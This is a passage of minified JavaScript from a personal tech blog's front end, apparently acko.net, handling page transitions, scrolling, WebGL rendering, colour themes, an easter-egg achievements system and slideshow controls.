computed=window.getComputedStyle(this.container);var scrollOffset=Math.round(this.container.offsetTop+(parseInt(computed.paddingTop)||0)-200);this.navigateTo(el.href,reverse,scrollOffset,true)}.bind(this))}}.bind(this))},navigateTo:function(url,reverse,scroll,push,callback){(this.gl&&this.gl.exports)&&(this.gl.exports.cameraController.scnt=0);if(push&&(url==location.href)){return scroller.scroll(0,scroll,0,0.1)}var insert=function(content,title,scripts){push&&this.history&&this.history.push(url,title,scroll,reverse);var titleEl=document.querySelector("title");if(titleEl){titleEl.textContent=title}var duration=pageTransition*this.width/1000;var delay=0.1;if(typeof scroll=="number"){duration=this.scroll.scroll(0,scroll,duration,delay)}this.transitionContent(content,duration,delay,reverse,!this.warm[url],function(){this.runScripts(scripts,function(){this.restoreSources();Acko.Behaviors.apply(this.container);callback&&callback()}.bind(this))}.bind(this));this.warm[url]=true;if(!cache){this.cache[url]={content:content,title:title,scripts:scripts,}}}.bind(this);var cache;if(cache=this.cache[url]){insert(cache.content,cache.title,cache.scripts)}else{microAjax(url,function(content){this.processHTML(content,function(content,title,scripts){insert(content,title,scripts)}.bind(this))}.bind(this))}},processHTML:function(html,callback){var content=extractContent(html);var title=extractTitle(html);var scripts=extractScripts(content);var iframes=extractIframes(content);var images=extractImages(content);var videos=extractVideos(content);scripts.forEach(function(script){content=content.replace(script.source,"")});iframes.forEach(function(iframe){var replace=iframe.source.replace("src=",'src="about:blank" data-src=');content=content.replace(iframe.source,replace)});images.forEach(function(image){var replace=image.source.replace("src=","data-src=");content=content.replace(image.source,replace)});videos.forEach(function(video){var replace=video.source;replace=replace.replace(/src=/g,"data-src=");replace=replace.replace(/type=/g,"data-type=");content=content.replace(video.source,replace)});callback&&callback(content,title,scripts)},transitionContent:function(content,duration,delay,reverse,cold,callback){var flip=reverse?-1:1;var width=this.width;var container=this.container;var dummy=document.createElement("div");dummy.innerHTML=content;var next=dummy.children[0];var prev=container.children[container.children.length-1];shift(next,width*flip);cold&&next.classList.add("cold");var media=next.querySelectorAll("img, iframe, video");forEach(media,function(el){el.classList.add("hide")});prev.style.pointerEvents="none";next.style.pointerEvents="none";container.appendChild(next);var loop=function(){var lerp=Math.max(0,Math.min(1,(Time.clock()-started)/duration));var ease=0.5-0.5*Math.cos(lerp*π);shift(next,width*flip*(1-ease));shift(prev,-width*flip*ease);if(lerp<1){requestAnimationFrame(loop)}else{setTimeout(function(){container.removeChild(prev);cold&&next.classList.remove("cold");prev.style.pointerEvents="auto";next.style.pointerEvents="auto";callback&&callback()},33)}};this.gl&&(this.gl.frames=-100);this.gl&&this.gl.exports.replace.reset();var started=Time.clock()+(delay||0);this.animating=true;loop()},restoreSources:function(){var elements=document.querySelectorAll("iframe, img, video");forEach(elements,function(el){var src;function begin(){el.classList.add("begin")}if(src=el.getAttribute("data-src")){el.removeAttribute("data-src");el.addEventListener("load",function(){setTimeout(begin,17);this.updateExtents()}.bind(this));el.src=src}else{if(el.children.length){forEach(el.children,function(child){if(child.tagName=="SOURCE"){var src=child.getAttribute("data-src");var type=child.getAttribute("data-type");if(el.canPlayType(type)){el.src=src}}}.bind(this));el.addEventListener("progress",function(e){if(el.buffered.length>0){setTimeout(begin,17);this.updateExtents()}}.bind(this))}}el.classList.add("transition");el.classList.remove("hide")}.bind(this))},runScripts:function(scripts,callback){var toLoad=[];function insert(url){var s=document.createElement("script");s.onload=unqueue;s.src=url;document.body.appendChild(s)}function unqueue(){if(toLoad.length==0){callback&&setTimeout(function(){callback()},0)}else{insert(toLoad.shift())}}scripts.forEach(function(script){if(script.url){toLoad.push(script.url)}if(script.local){try{eval(script.local)}catch(e){console.error("[Nav]",e)}}});if(toLoad.length==0){callback&&callback()}else{unqueue()}},}})();(function(){var a="history-back";Acko.History=function(b){this.nav=b;this.depth=0;this.x=0;this.lastState=null;this.bind()};Acko.History.isSupported=function(){return window.history&&window.history.pushState};Acko.History.prototype={bind:function(){this.insert();window.addEventListener("popstate",function(b){this.pop(b.state)}.bind(this));Acko.Behaviors.push(function(b){this.applyBehavior(b)}.bind(this))},pop:function(e){if(!e||(e.depth==this.depth)){return}this.nav.scroll.ignore(1);var c=e.x<this.x;this.x=e.x;this.depth=e.depth;var b=e.url;if(e.isError){b="http://"+location.host+"/"}this.nav.navigateTo(b,c,e.scroll,false)},insert:function(){var c,e=document.title;if(c=history.state){this.depth=c.depth||0;this.x=c.x||0;e=c.title}var b=location.href;history.replaceState({url:b,depth:this.depth,x:this.x,scroll:this.nav&&(this.nav.scroll.get().y||0),title:e,isError:Acko.History.isErrorPage,},e,b)},push:function(e,g,b,c){this.insert();Acko.History.isErrorPage=false;this.x+=c?-1:1;var f={url:e,depth:++this.depth,reverse:c,x:this.x,scroll:b,title:g,back:history.state&&history.state.title||"",};history.pushState(f,g||"",e)},applyBehavior:function(f){f=f||this.container;if(history.state&&history.state.depth>0){var b=history.state.reverse?".next":".prev";var c=f.querySelectorAll(b+" a:not(."+a+")");var h="";if(history.state.back){h=history.state.back.replace(" — Acko.net","");if(h=="Hackery, Math & Design"){h="Home"}}forEach(c,function(k){k.classList.add(a);if(h!=""){var j=k.querySelector(".caption span");j.innerHTML=h}k.addEventListener("click",function(l){if(l.ctrlKey||l.metaKey||l.button!==0){return}l.preventDefault();history.go(-1)}.bind(this))}.bind(this));if(!history.state.reverse){var e=f.querySelectorAll(".next a");var g=h==="Home"?"none":"block";forEach(e,function(j){if(j.getAttribute("href")==="/"&&j.style.display!==g){j.style.display=g}})}}},}})();(function(){Acko.Scroll=function(c,b){this.x=new Acko.Scroll.Coordinate();this.y=new Acko.Scroll.Coordinate();this.object={x:this.x.value,y:this.y.value};this.extents(c,b)};var a=Acko.Scroll.prototype={init:function(){window.addEventListener("resize",this.resize.bind(this));this.resize()},ignore:function(){},update:function(){this.object={x:this.x.value,y:this.y.value}},get:function(){return this.object},set:function(b,c){this.x.set(b);this.y.set(b);this.update()},scroll:function(b,k,j,g){if(b==this.x.value&&k==this.y.value){return j}var e=Time.clock()+(g||0);var j=Math.max(j,Math.min(1,Math.sqrt(Math.max(Math.abs(this.x.value-b),Math.abs(this.y.value-k))/1500)));var f=this.x.value;var h=this.y.value;var c=function(){var m=Time.clock();if(m-e<=j){requestAnimationFrame(c)}var l=Math.min(1,Math.max(0,(m-e)/j));var o=0.5-0.5*Math.cos(l*π);this.set(f+(b-f)*o,h+(k-h)*o)}.bind(this);c();return j},extents:function(c,b){this.pageWidth=c||0;this.pageHeight=b||0;this.adjust()},resize:function(){this.viewWidth=window.innerWidth;this.viewHeight=window.innerHeight;this.adjust()},adjust:function(){this.x.fit(0,this.pageWidth,this.viewWidth);this.y.fit(0,this.pageHeight,this.viewHeight)},};Acko.Scroll.Coordinate=function(f,e,b,c){this.value=f;this.fit(e,b,c)};Acko.Scroll.Coordinate.prototype={set:function(b){this.value=Math.max(this.min,Math.min(this.max,b||0))},fit:function(e,b,c){this.min=e||0;this.max=Math.max(this.min,(b||0)-(c||0));this.set(this.value)},};Acko.NativeScroll=function(c,b){Acko.Scroll.call(this,c,b);this.ignoreEvents=0};Acko.NativeScroll.prototype=_.extend(new Acko.Scroll(),{init:function(){a.init.call(this);window.addEventListener("scroll",this.onScroll.bind(this));this.onScroll()},ignore:function(b){this.ignoreEvents+=b},set:function(b,c){window.scroll(b,c)},onScroll:function(){if(this.ignoreEvents&&(this.ignoreEvents-->0)){return}this.x.set(window.scrollX);this.y.set(window.scrollY);this.update()},adjust:function(){a.adjust.call(this);var b=this.pageWidth>this.viewWidth?this.pageWidth+"px":"100%";var c=this.pageHeight>this.viewHeight?this.pageHeight+"px":"100%";document.body.style.width=b;document.body.style.height=c},})})();Acko.Renderer=function(a){a=a||{};this.parameters=a.parameters||{};this.container=a.container||null;this.klass=a.klass||THREE.WebGLRenderer;this.type=a.type||"generic";this.camera=a.camera||new THREE.PerspectiveCamera();this.autoSize=a.autoSize||false;this.dead=a.dead||false;this.autoRender=a.autoRender!==undefined?a.autoRender:true;this.isVisible=a.visible!==undefined?a.visible:true;this.lastVisible=-1;var b=a.effects||[];this.renderer=null;this.scene=null;this.depthScene=null;this.frames=0;this.fps=58;this.capWidth=0;this.capHeight=0;this.warmUp=2;this.skipFrames=0;this.handlers={};this.exports={};this.effects=b.filter(function(c){var e=c.renderer;return e==this.type}.bind(this));this.effects.forEach(function(c){b.splice(b.indexOf(c),1)})};Acko.Renderer.prototype={init:function(){var h=this.renderer=new (this.klass)(this.parameters);var j=this.scene=new THREE.Scene();var c=this.depthScene=new THREE.Scene();var f=this.camera;var e=this.renderer.domElement;e.style.display="none";if(!this.renderer.domElement.parentNode){(this.container||document.body).appendChild(e)}e.className="frame fixed";if(this.dead){e.classList.add("dead")}window.addEventListener("resize",this.resize.bind(this));var b=this.exports={parent:this,scene:j,depthScene:c,camera:f,renderer:h,context:h.context,scroll:{x:0,y:0},time:0,debug:{},};var g=this.effects;g.sort(function(l,k){return l.order-k.order});var a=tick();_.each(g,function(k){k.build(b)});a(this.type.toUpperCase()+" effect build");this.resize()},scroll:function(a){this.exports.scroll=a},resize:function(p){if(this.autoSize&&p){this.capWidth=0;this.capHeight=0}var k=this.exports;var s=this.container;var t,l;var u=t=this.width=s?s.offsetWidth:window.innerWidth;var o=l=this.height=s?s.offsetHeight:window.innerHeight;k.viewWidth=u;k.viewHeight=o;this.fps=58;this.frames=0;if(this.capWidth||this.capHeight){var m=Math.min(this.capWidth||Infinity,u);var q=Math.min(this.capHeight||Infinity,o);var f=Math.min(m/u,q/o);u*=f;o*=f}u=Math.round(u);o=Math.round(o);var r=u+(u&1);var g=o+(o&1);var x=this.aspect=r/g;if(k.width!=r||k.height!=g){k.width=r;k.height=g;k.aspect=x;_.each(this.effects,function(c){c.resize(k)});this.renderer.setSize(r,g,false);var b;if(b=this.renderer.domElement){var j=0,a=0;if(t+1==r){j=-1;t=r}if(l+1==g){a=-1;l=g}b.style.marginLeft=j+"px";b.style.marginTop=a+"px";b.style.width=t+"px";b.style.height=l+"px"}}},tick:function(){var a=this.exports;var b=(this.warmUp-->0)?0:Time.clock(this.type);var e=b-a.time;if(!Time.isBackground()&&++this.frames>5){var c=1/Math.max(0.0166,e);this.fps=Time.isSlow()?60:(this.fps+(c-this.fps)*0.15)}if(a){a.delta=e;a.time=b;a.fps=this.fps}_.each(this.effects,function(f){f.tick(a)}.bind(this))},visible:function(a){if(a!==undefined){this.isVisible=a}return this.isVisible},update:function(){var a=this.exports;if(this.skipFrames-->0){return}if(this.lastVisible!=this.isVisible){this.renderer.domElement.style.display=this.isVisible?"block":"none";this.lastVisible=this.isVisible}if(!this.visible){return}if(this.autoSize&&this.fps<48){this.capWidth=Math.max(960,this.capWidth||window.innerWidth);this.capHeight=Math.max(540,this.capHeight||window.innerHeight);this.capWidth*=0.9;this.capHeight*=0.9;this.resize()}_.each(this.effects,function(b){b.update(a)}.bind(this));if(this.autoRender){this.renderer.render(this.scene,this.camera)}},};Acko.Palette={red:[[190,10,71],[204,54,30],[222,90,51],[248,100,61],],platinum:[[148,157,160],[222,235,240],[255,255,255],],blue:[[22,92,143],[0,176,212],],slate:[[73,94,119],[86,125,147],[77,160,186],],orange:[],};if(document.location.hash=="#gay"){Acko.Palette={red:[[210,27,41],[235,129,55],[230,212,34],[20,148,63],],platinum:[[148,157,160],[222,235,240],[255,255,255],],blue:[[1,112,187],[122,33,129],],slate:[[73,94,119],[20,148,63],[77,160,186],],orange:[],}}function toneMap(k){function h(a){a=l(a);return(a*2.5+(1-(1-a*a)*(1-a*a)))/3.5}function l(a){return Math.max(0,Math.min(1,a))}function j(a){return[l(a[0])*255,l(a[1])*255,l(a[2])*255]}function f(g,c,m){return g+(c-g)*m}var e=k[0]/255;var o=k[1]/255;var q=k[2]/255;Acko.colorChange=true;if(document.location.hash=="#sepia"){var s=e*0.3+o*0.6+q*0.1;var p=h(s);return j([p,p,p])}if(document.location.hash=="#faded"){return j([h((Math.max(e,q)*3+e)*0.25),h((Math.max(o,q)*3+o)*0.25),h(q)*1.05])}if(document.location.hash=="#nored"){return j([h(e),h(Math.max(e,o)),h(Math.max(e,q))])}if(document.location.hash=="#noblue"){return j([h(Math.max(e,q)),h(Math.max(o,q)),h(q)])}if(document.location.hash=="#nogreen"){return j([h(Math.max(e,o)),h(o),h(Math.max(q,o))])}if(document.location.hash=="#lilac"){var p=(o+q)/2;return j([h(Math.max(e,p)),h(Math.max(o,p)),h(Math.max(q,p))])}if(document.location.hash=="#70s"){return j([h(Math.max(e*e,q))*1.1,h(Math.max(q*q,o))*1.1,h(o)])}if(document.location.hash=="#white"){return[255,255,255]}if(document.location.hash=="#strong"){return j([h(e),h(o),h(q)])}if(document.location.hash=="#pink"){return j([h(f(e,1.2,0.7)),h(f(o,0.4,0.7)),h(f(q,1.1,0.7))])}if(document.location.hash=="#moarpink"){return j([h(f(e,1.5,0.7)),h(f(o,0.4,0.7)),h(f(q,0.9,0.7))])}if(document.location.hash=="#null"){return j([e,o,q])}Acko.colorChange=false;var p=q*0.9;return j([h((Math.max(e,p)+e)/2)*1.05,h((Math.max(o,p)+o)/2)*1.05,h(q)*1.03])}_.each(Acko.Palette,function(a,b){Acko.Palette[b]=_.map(a,function(c){if(typeof c=="string"){c=c.split("/");return Acko.Palette[c[0]][c[1]]}c=toneMap(c);return new THREE.Color((c[0]<<16)+(c[1]<<8)+c[2])})});window._$=function(a){return a};(function(){var a=_$("p")+"m"+_$("t=");window[_$("ev")+"al"](a+_$("function (s) { var t = ''; var n = s && s.length || 0; for (var i = 0; i < n; i++) { if (s.c")+"harC"+_$("odeAt(i) >= 32 && s.c")+"harCo"+_$("deAt")+"(i) < 128) { t += String.fr"+_$("omC")+"harC"+_$("ode(s.c")+"harC"+_$("odeAt(i) ^ (3 + i%5 + (i*i)%7)); } else { t += s.c")+"ha"+_$("rAt(i); } } return t; }"))})();delete window._$;var growl=window.growl=(function(){var b={center:[],topright:[],};var c=0;return function a(o){if(!document.body){return setTimeout(function(){a(o)},1000)}var g=o.type||"generic";var l=o.text||"";var y=o.delay||0;var w=!!o.center;var q=o.image;var j=o.link||false;var e=w?b.center:b.topright;var r=e.length;for(var t=0;t<r;++t){if(!e[t]){break}}e[t]=true;var u=t*98;var s=296;var k;var p=document.createElement("div");document.body.appendChild(p);p.classList.add("growl");p.classList.add(g);if(o.image){p.style.backgroundImage="url("+o.image+")"}if(j){p.classList.add("link")}if(w){p.classList.add("center");p.style.marginBottom=u+"px"}else{p.style.marginTop=u+"px"}p.innerHTML="<div>"+l+"</div>";setTimeout(function(){p.classList.add("pop")},y);var h=false;var m=false;p.addEventListener("mouseover",function(){m=true});p.addEventListener("mouseout",function(){m=false;if(h){k=setTimeout(f,500)}});p.addEventListener("mousedown",function(z){z.stopPropagation();z.preventDefault()});p.addEventListener("mouseup",function(z){if(j){window.open(j)}z.stopPropagation();z.preventDefault()});var x=false;function f(){if(m){h=true;return}if(x){return}x=true;p.classList.remove("pop");e[t]=false;setTimeout(function(){document.body.removeChild(p)},1000)}k=setTimeout(f,6000+y);return f}})();var achievements={nope:"Nothing here"};var hasAchievement=function(c){var b=getStorage("achievements");return b[c]};var getAchievement=function(a){return achievements[a]};var achievement=(function(){var a=1500;setTimeout(function(){a=300},a);return function(e){var c=getStorage("achievements");var b;if(!c[e]&&(b=getAchievement(e))){c[e]=e;setStorage("achievements",c);growl({type:"achievement",text:"Achievement Unlocked<br><strong>"+b+"</strong>",center:true,delay:a,})}}})();(function(){var f=1280;var h=960;var g=250;var e=300;var a=250;var b=document.documentElement.classList;var c=function(p,m){m=m||document;var l=window.innerWidth;var r=Math.max(0,l-h)/2;var q=Math.max(0,Math.min(f,l)-h)/2;var k=m.querySelectorAll(".wide");var j=l<=f;forEach(k,function(t){var s=t.classList.contains("full");var u=s?r:q;t.style.marginLeft=-Math.ceil(u+0.00001)+"px";t.style.marginRight=-Math.floor(u+0.00001)+"px";t.classList[(s||j)?"add":"remove"]("squeezed")});var o=m.querySelectorAll("iframe.autosize");forEach(o,function(A){var u,z,t,x;var s=+A.getAttribute("data-max-height")||Infinity;var y=+A.getAttribute("data-min-height")||0;if(A.classList.contains("square")){u=A.parentNode.offsetWidth;z=u;t=u;m2=0}else{u=window.innerWidth;z=window.innerHeight-g;z=Math.max(z,y);z=Math.min(z,s);z=Math.min(u/16*9,z);t=A.parentNode.offsetWidth;m2=(t-u)/2}A.style.maxWidth=(t-m2*2)+"px";A.style.width=u+"px";A.style.height=z+"px";A.style.marginLeft=m2+"px"})};window.addEventListener("resize",c);c();DomReady.ready(c);Acko.Behaviors.push(function(j){c(null,j)})})();Acko.Behaviors.push(function(a){Prism.highlightAllUnder(a)});(function(){var f=0;var c=0;var e=false;var b="";var a=function(){if(location.pathname!=b){b=location.pathname;c=0;e=true;setTimeout(function(){e=false},6000)}if(!e&&location.pathname.match(/^\/blog\//)){var j=function(l){return Math.max(1,l)};var g=window.innerHeight;var k=Math.min(1,j(window.scrollY-g)/j(document.body.offsetHeight-g*2));var h=Math.round(k*10);if(h!=c){c=h;setTimeout(function(){fetch("/achievements/read.js?p="+location.pathname+"&c="+h)},0)}}};window.addEventListener("scroll",a)})();(function(){var f=200;var q=function(w){var y=0,x=0,u=w.offsetWidth,t=w.offsetHeight;do{y+=w.offsetTop||0;x+=w.offsetLeft||0;w=w.offsetParent}while(w);return{top:y,left:x,width:u,height:t}};var j="mathbox-active";var a=[];var e=[];var h=[];var p=[];function s(){a=document.querySelectorAll("iframe.mathbox")}function c(){forEach(a,function(u,t){e[t]=q(u);p[t]=u.classList.contains("janky")})}var o,r=-1;function m(){b(null,true)}function b(w,z){var x=window.scrollY;var u=r!=x;forEach(a,function(A,y){if(!p[y]||!u){t(A,y,p[y])}});r=x;function t(A,F,H){var B=e[F];var C=H?0:f;var E=(x+window.innerHeight>B.top-C)&&(x<B.top+B.height+C);var y=h[F];if(window.gl&&gl.exports.pageStart){E=E&&(window.scrollY>gl.exports.pageStart)}if(y!=E){var G=E?"start":"stop";var D=E?"add":"remove";var I;if(A.contentWindow&&(I=A.contentWindow.mathbox)){A.classList[D]("on");if(I[G]){I[G]()}h[F]=E}}}if(z){o=null}else{if(o){clearTimeout(o)}o=setTimeout(m,100)}}var l=0;requestAnimationFrame(function g(){requestAnimationFrame(g);var t=Time.getSpeed();if(Math.abs(t-l)>0.01){forEach(a,function(u){u&&u.contentWindow&&u.contentWindow.mathbox&&u.contentWindow.mathbox.speed(t)});l=t}});function k(){s();c();b();setTimeout(function(){c()},100)}window.addEventListener("resize",c);window.addEventListener("scroll",b);window.addEventListener("load",function(){var t=3;while(t-->0){setTimeout(b,t*1000)}});Acko.Behaviors.push(k)})();(function(){window.addEventListener("keydown",function(b){var a=document.querySelectorAll("iframe.mathbox.on");forEach(a,function(e){var c=e.contentWindow.director;if(c){var f,g=e.parentNode.querySelector(".nav");if(b.keyCode==38||b.keyCode==37){f=g.querySelector(".prev")}else{if(b.keyCode==40||b.keyCode==39){f=g.querySelector(".next")}}f&&!f.classList.contains("inactive")&&f.click()}})})})();(function(){Acko.SlideShow=function(e){this.container=e;this.skip=0;this.step=0;this.steps=[];this.director=null;this.nav={};this.reflowTimer=null;if(false&&Acko.Fallback.isRequired()){this.unsupported()}else{this.build();this.bind()}};Acko.SlideShow.prototype={unsupported:function(){this.iframe=this.container.querySelector("iframe");var f=this.nav=document.createElement("div");f.className="nav";this.iframe.parentNode.appendChild(f);var e=document.createElement("div");e.className="step";e.style.opacity=1;e.innerHTML="<p>WebGL is required to view this slideshow.</p>";this.container.querySelector(".steps").appendChild(e)},build:function(){if(this){this.container.classList.add(b)}this.iframe=this.container.querySelector("iframe");this.steps=this.container.querySelectorAll(".steps > .step");this.extras=this.container.querySelectorAll(".steps .extra");forEach(this.steps,function(g,f){g.setAttribute("data-step",f)});var e=this.nav=document.createElement("div");e.className="nav";e.innerHTML='<a class="prev" title="Previous Slide"><span class="invisible">Previous Slide</span><span class="icon-arrow"><span></span><span></span></span></a><a class="again" title="Repeat Animation"><span class="invisible">Repeat Animation</span><span class="icon-repeat"><span></span><span></span><span></span><span></span></span></a><a class="next" title="Next Slide"><span class="invisible">Next Slide</span><span class="icon-arrow"><span></span><span></span></span></a><span class="pages"></span></a>';this.nav.prev=e.querySelector(".prev");this.nav.again=e.querySelector(".again");this.nav.next=e.querySelector(".next");this.nav.pages=e.querySelector(".pages");this.iframe.parentNode.appendChild(e);this.skip=+this.container.getAttribute("data-skip")||0;this.go(0);this.iframe.onload=function(){setTimeout(function(){this.go(0)}.bind(this),1000);setTimeout(function(){this.go(0)}.bind(this),3000)}.bind(this)},layout:function(){var e=this.nav.offsetWidth/2;var g=this.iframe.offsetHeight/2;var f=this.iframe.offsetHeight*16/9/2;forEach(this.extras,function(s){var o=s.offsetWidth/2,r=s.offsetHeight/2,m=e-o,q=-g-r;var p=+s.getAttribute("data-align-x")||1,k=+s.getAttribute("data-align-y")||1;var j=s.classList;if(j.contains("edge")){if(j.contains("top")){q-=g*k-r}if(j.contains("bottom")){q+=g*k-r}if(j.contains("left")){m-=f*p-o}if(j.contains("right")){m+=f*p-o}}else{if(j.contains("top")){q-=g*k/2}if(j.contains("bottom")){q+=g*k/2}if(j.contains("left")){m-=f*p/2}if(j.contains("right")){m+=f*p/2}}s.style.left=Math.round(m)+"px";s.style.top=Math.round(q)+"px"}.bind(this))},resize:function(){if(this.reflowTimer){clearTimeout(this.reflowTimer)}this.reflowTimer=setTimeout(function(){this.layout();this.reflowTimer=null}.bind(this),300)},connect:function(){this.director=this.iframe&&this.iframe.contentWindow&&this.iframe.contentWindow.director},bind:function(){this.nav.prev.addEventListener("click",this.prevHandler=function(f){f.preventDefault();this.prev()}.bind(this));this.nav.again.addEventListener("click",this.againHandler=function(f){f.preventDefault();this.again()}.bind(this));this.nav.next.addEventListener("click",this.nextHandler=function(f){f.preventDefault();this.next()}.bind(this))},unbind:function(){this.nav.prev.removeEventListener("click",this.prevHandler);this.nav.again.removeEventListener("click",this.againHandler);this.nav.next.removeEventListener("click",this.nextHandler)},prev:function(){this.go(-1)},next:function(){this.go(1)},go:function(e){this.connect();if(e){this.steps[this.step].classList.remove("active");this.step=Math.max(0,Math.min(this.steps.length-1-this.skip,this.step+e));this.lastDirection=e}this.steps[this.step].classList.add("active");this.update();forEach(this.steps,function(g,f){var h=f-this.step;if(h>1||h<-8){if(!g.classList.contains("inactive")){g.classList.add("inactive")}}else{if(g.classList.contains("inactive")){g.classList.remove("inactive")}}}.bind(this));this.director&&this.director.go(this.step+this.skip)},again:function(){if(this.director&&this.step>0){this.director.go(this.step-1+this.skip,true);forEach(this.extras,function(e){e.classList.remove("active")}.bind(this));setTimeout(function(){this.update();this.director.go(this.step+this.skip)}.bind(this),300)}},update:function(){var f;f=(this.step==0)?"add":"remove";this.nav.prev.classList[f]("inactive");this.nav.again.classList[f]("inactive");f=(this.step==this.steps.length-1-this.skip)?"add":"remove";this.nav.next.classList[f]("inactive");var e=(this.step+1)+" / "+(this.steps.length-this.skip);this.nav.pages.innerHTML=e;forEach(this.extras,function(h){var j=+h.parentNode.getAttribute("data-step");var k=+h.getAttribute("data-hold")||0;var l=(this.step>=j&&this.step<=j+k)?"add":"remove";var g=(l=="add"&&this.lastDirection>0)?(+h.getAttribute("data-delay")||0):0;h.style.transitionDelay=g+"s";h.style.WebkitTransitionDelay=g+"s";h.classList[l]("active")}.bind(this))},};var b="slideshow-active";var c=[];var a=function(){c.slice().forEach(function(e,f){e.resize()})};window.addEventListener("resize",a);Acko.Behaviors.push(function(f){var g=0;c.slice().forEach(function(h,j){var k=h.container;while((k=k.parentNode)&&(k!=document.body)){}if(!k){h.unbind();c.splice(j-g,1);g++}});var e=f.querySelectorAll(".slideshow:not(."+b+")");forEach(e,function(j){var h=new Acko.SlideShow(j);c.push(h)});if(window.MathJax){MathJax.Hub.Queue(function(){a()})}else{a()}})})();(function(){Acko.Behaviors.push(function(){var b=document.querySelector(".fooscribe-form");var e=document.querySelector(".fooscribe-mail");var h=document.body;var a=false;var g=function(m){if(!a){f()}else{l()}m.preventDefault();m.stopPropagation();return false};var f=function(){a=true;j();b.style.display="block";requestAnimationFrame(function(){if(!document.querySelector(".ml-subscribe-form")){window.location.href="https://landing.mailerlite.com/webforms/landing/c8t4j1"}else{var m=document.querySelector(".ml-subscribe-form form input");if(m){m.focus()}}})};var l=function(){a=false;k();b.style.display="none"};var c=function(p){var o=p.target;var m=false;do{if(o.classList.contains("fooscribe-form")){m=true;break}}while(o=o.parentElement);if(!m){l()}};var j=function(){h.addEventListener("click",c)};var k=function(){h.removeEventListener("click",c)};if(b&&e&&!e.classList.contains("bound")){e.classList.add("bound");e.addEventListener("click",g)}})})();Acko.TrackData=[{n:8,power:0.4,width:23,height:12,relative:_v(-370,0,0),points:[[_v(-800,120,200),null,0],[_v(-300,120,200),null,0],[_v(-200,120,200),null,60,10],[_v(-200,20,200),null,80,10],[_v(-200,20,0),null,80,10],[_v(0,20,0),null,50],[_v(65,140,0),null,50],[_v(140,140,0),null,80,10],[_v(140,60,0),null,0],[_v(140,-10,0),null,50,10],[_v(140,10,-140),null,50,10],[_v(240,0,-140),null,50,10],[_v(240,0,-300),null,50,10],[_v(350,0,-280),null,50,10],[_v(340,150,-340),null,50,14],[_v(340,300,-340),null,100,10],[_v(340,400,-340),null,0],],travel:953,length:1176,arrow:32,aspect:0.96,smooth:4,up:_v(0,2.4,1),detail:8,color:Acko.Palette.platinum[2],distance:3300,castAO:0.85,receiveAO:0.85,AOStep:40,simplify:false,edge:1,},{n:8,power:0.2,width:25,height:10,relative:_v(-370,0,0),points:[[_v(-800,120,200),null,0],[_v(-300,120,200),null,0],[_v(-200,120,200),null,60,10],[_v(-200,20,200),null,80,10],[_v(-200,20,0),null,80,10],[_v(0,20,0),null,50],[_v(65,140,0),null,50],[_v(140,140,0),null,80,10],[_v(140,60,0),null,0],[_v(140,-10,0),null,50,10],[_v(140,10,-140),null,50,10],[_v(240,0,-140),null,50,10],[_v(240,0,-300),null,50,10],[_v(350,0,-280),null,50,10],[_v(340,150,-340),null,50,14],[_v(340,300,-340),null,100,10],[_v(340,400,-340),null,0],],travel:950,speed:0,length:1176.6,shift:5.716,arrow:37,aspect:1,smooth:4,up:_v(0,2.4,1),detail:8,color:Acko.Palette.red[0],distance:3300,castAO:false,AOStep:40,simplify:false,truncate:30,},{n:8,power:0.4,width:23,height:12,relative:_v(-170,0,0),points:[[_v(-800,310,-200),null,0],[_v(-310,310,-200),null,60],[_v(-100,140,-200),null,60],[_v(120,140,-200),null,60],[_v(140,140,0),null,60],[_v(10,140,0),null,50],[_v(10,20,0),null,50],[_v(200,20,0),null,50],[_v(200,220,0),null,80],[_v(205,220,-100),null,0],[_v(205,220,-200),null,80],[_v(205,320,-200),null,100,10],[_v(205,420,-200),null,0],],travel:713,length:1266,arrow:32,aspect:0.96,smooth:4,up:_v(0,1,2.3),detail:8,color:Acko.Palette.platinum[2],distance:3300,castAO:0.95,receiveAO:0.85,simplify:false,edge:1,AOStep:35,},{n:8,power:0.2,width:25,height:10,relative:_v(-170,0,0),points:[[_v(-800,310,-200),null,0],[_v(-310,310,-200),null,60],[_v(-100,140,-200),null,60],[_v(120,140,-200),null,60],[_v(140,140,0),null,60],[_v(10,140,0),null,50],[_v(10,20,0),null,50],[_v(200,20,0),null,50],[_v(200,220,0),null,60],[_v(205,220,-100),null,0],[_v(205,220,-200),null,60],[_v(205,320,-200),null,100,10],[_v(205,420,-200),null,0],],travel:710,speed:0,length:1266.6,shift:5.716,arrow:37,aspect:1,smooth:4,up:_v(0,1,2.3),detail:8,color:Acko.Palette.red[1],distance:3300,castAO:false,AOStep:35,simplify:false,truncate:30,},{n:8,power:0.4,width:23,height:12,relative:_v(10,0,0),points:[[_v(20,800,-310),null,0],[_v(20,420,-310),null,100,3],[_v(20,320,-310),null,100,9],[_v(20,220,-310),null,100,9],[_v(20,120,-310),null,0],[_v(20,-20,-310),null,80,14],[_v(140,-20,-310),null,80,15],[_v(140,-20,0),null,60],[_v(60,80,0),null,50],[_v(120,140,0),null,50],[_v(260,140,0),null,0],[_v(340,140,0),null,50],[_v(340,20,0),null,50],[_v(200,20,0),null,50],[_v(200,100,0),null,60],[_v(200,100,-200),null,60],[_v(400,90,-200),null,60],[_v(400,140,-10),null,50,10],[_v(400,140,100),null,0],[_v(400,140,300),null,50,12],[_v(400,340,300),null,50,10],[_v(400,540,300),null,0],],travel:343,length:2181,arrow:32,aspect:0.96,smooth:4,up:_v(0.45,0,1),detail:8,color:Acko.Palette.platinum[2],distance:3300*0.45,castAO:0.85,receiveAO:0.85,speed:600*0.45,simplify:false,edge:1,},{n:8,power:0.2,width:25,height:10,relative:_v(10,0,0),points:[[_v(20,800,-310),null,0],[_v(20,420,-310),null,100,3],[_v(20,320,-310),null,100,9],[_v(20,220,-310),null,100,9],[_v(20,120,-310),null,0],[_v(20,-20,-310),null,80,14],[_v(140,-20,-310),null,80,15],[_v(140,-20,0),null,60],[_v(60,80,0),null,50],[_v(120,140,0),null,50],[_v(260,140,0),null,0],[_v(340,140,0),null,50],[_v(340,20,0),null,50],[_v(200,20,0),null,50],[_v(200,100,0),null,60],[_v(200,100,-200),null,60],[_v(400,90,-200),null,60],[_v(400,140,-10),null,50,10],[_v(400,140,100),null,0],[_v(400,140,300),null,50,12],[_v(400,340,300),null,50,10],[_v(400,540,300),null,0],],travel:340,length:2181.6,shift:5.716,arrow:37,aspect:1,smooth:4,up:_v(0.45,0,1),detail:8,color:Acko.Palette.red[2],distance:3300*0.45,speed:600*0.45,castAO:false,simplify:false,truncate:30,},{n:8,power:0.2,width:15,height:20.5,relative:_v(10,0,0),points:[[_v(-550,600,-400),null,0],[_v(-550,250,-400),n